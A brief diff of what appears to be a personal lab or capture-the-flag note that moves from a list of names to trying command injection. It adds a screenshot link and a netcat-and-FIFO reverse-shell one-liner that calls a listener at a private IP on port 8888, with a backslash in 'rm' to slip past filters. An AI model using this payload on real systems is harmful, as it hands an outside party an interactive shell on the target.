@@ -73,5 +73,8 @@ Anurodh
 Apaar
 
 ---
+Now lets try command Injection :
 
+
+![[Pasted image 20260209225117.png]]
 r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.209.139 8888 >/tmp/f
